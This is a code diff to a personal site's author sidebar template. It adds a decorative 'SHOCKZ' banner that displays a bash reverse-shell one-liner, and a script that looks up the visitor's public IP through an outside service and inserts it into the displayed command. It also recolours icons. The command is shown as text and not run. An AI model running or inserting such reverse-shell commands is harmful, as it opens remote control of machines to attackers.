@@ -33,6 +33,27 @@
       <h3 class="author__name" itemprop="name">{{ author.name }}</h3>
     {% endif %}-->
     <div class="glitch author__name" data-text="SHOCKZ">SHOCKZ</div>
+    <div width="100%;" style="margin-bottom: 10%;">
+      <div id="shell" class="site-header__subtitle" style="color:#16c8d1;font-size: 13px;" data-cursive="">
+        bash -i &gt;&amp; /dev/tcp/localhost/1337 0&gt;&amp;1
+      </div>
+    </div>
+    <script>
+      var shell = document.querySelector('#shell')
+      var ipheader = ""
+      httpRequest = new XMLHttpRequest()
+      httpRequest.open('GET', 'https://api.ipify.org?format=json&callback=')
+      
+      httpRequest.onload = function(){    
+          if(this.readyState == 4 && this.status == 200){
+              ipheader = JSON.parse(this.response)
+              shell.textContent = shell.textContent.replace(/^(?=[\S\s]{10,8000})[\S\s]*$/, "bash -i >& /dev/tcp/"+ipheader['ip']+"/1337 0>&1");
+          }else{
+              shell.textContent = shell.textContent.replace(/^(?=[\S\s]{10,8000})[\S\s]*$/, "bash -i >& /dev/tcp/localhost/1337 0>&1");
+          }
+      }
+      httpRequest.send()
+    </script>
     {% if author.bio %}
       <p class="author__bio" itemprop="description">
         {{ author.bio }}
@@ -86,7 +107,7 @@
       {% if author.twitter %}
         <li>
           <a href="https://twitter.com/{{ author.twitter }}" itemprop="sameAs" rel="nofollow noopener noreferrer">
-            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true" style="color:white"></i> Twitter
           </a>
         </li>
       {% endif %}
@@ -150,7 +171,7 @@
       {% if author.github %}
         <li>
           <a href="https://github.com/{{ author.github }}" itemprop="sameAs" rel="nofollow noopener noreferrer">
-            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+            <i class="fab fa-fw fa-github" style="color:white;" aria-hidden="true"></i> GitHub
           </a>
         </li>
       {% endif %}
